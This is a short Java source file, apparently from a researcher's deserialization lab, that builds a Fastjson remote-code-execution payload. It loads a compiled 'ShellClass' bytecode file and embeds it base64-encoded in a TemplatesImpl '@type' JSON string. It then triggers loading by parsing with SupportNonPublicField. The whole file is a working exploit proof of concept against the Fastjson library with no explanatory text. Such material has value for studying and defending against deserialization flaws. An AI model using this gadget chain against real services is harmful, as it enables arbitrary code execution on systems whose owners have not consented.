package Seri.FastJsonGadgets;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.Feature;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;

import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Base64;

import static Seri.Utils.setValue;

public class TemplatesImplFJ {
    public static void main(String[] args) throws Exception {
        TemplatesImpl templateimpl = new TemplatesImpl();
        byte[] bytes = Files.readAllBytes(Paths.get("/Users/y1shin/IdeaProjects/Seri/target/classes/Seri/ShellClass.class"));
        String b64 = Base64.getEncoder().encodeToString(bytes);
        System.out.println(b64);


        setValue(templateimpl,"_name","aaa");
        setValue(templateimpl,"_bytecodes",new byte[][] {bytes});
        setValue(templateimpl,"_tfactory",new TransformerFactoryImpl());

        String payload = String.format("{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_name\":\"aa\",\"_bytecodes\":[\"%s\"],\"_tfactory\":{},\"_outputProperties\": {}}" ,b64);
        JSON.parseObject(payload, Feature.SupportNonPublicField);
    }
}
